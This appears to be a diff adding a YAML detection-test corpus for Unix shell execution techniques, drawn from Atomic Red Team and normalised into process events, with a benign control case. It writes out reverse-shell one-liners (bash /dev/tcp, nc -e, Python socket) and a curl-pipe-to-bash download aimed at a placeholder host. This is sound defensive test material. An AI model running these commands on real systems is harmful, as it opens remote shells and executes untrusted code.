@@ -1,0 +1,51 @@
+# 语料：执行类手法。命令行取自 Atomic Red Team 测试过程的原文，
+# 归一化成本平台事件格式（process.cmd_line）。
+technique: T1059.004
+name: Unix Shell
+cases:
+  - name: bash 反弹 shell（/dev/tcp）
+    source: atomic T1059.004
+    class: 1007
+    os: linux
+    event:
+      process:
+        name: bash
+        cmd_line: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+
+  - name: nc -e 反连
+    source: atomic T1059.004
+    class: 1007
+    os: linux
+    event:
+      process:
+        name: nc
+        cmd_line: "nc -e /bin/sh 10.0.0.1 4444"
+
+  - name: python socket 反弹 shell
+    technique: T1059.006
+    source: atomic T1059.006
+    class: 1007
+    os: linux
+    event:
+      process:
+        name: python3
+        cmd_line: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444))'"
+
+  - name: 下载后管道进 shell
+    source: atomic T1059.004
+    class: 1007
+    os: linux
+    event:
+      process:
+        name: bash
+        cmd_line: "curl -s http://10.0.0.1/payload.sh | bash"
+
+  - name: 普通 sh -c 执行（不该单独告警）
+    source: atomic T1059.004 良性对照
+    class: 1007
+    os: linux
+    expect: undetected
+    event:
+      process:
+        name: sh
+        cmd_line: "sh -c 'echo hello'"
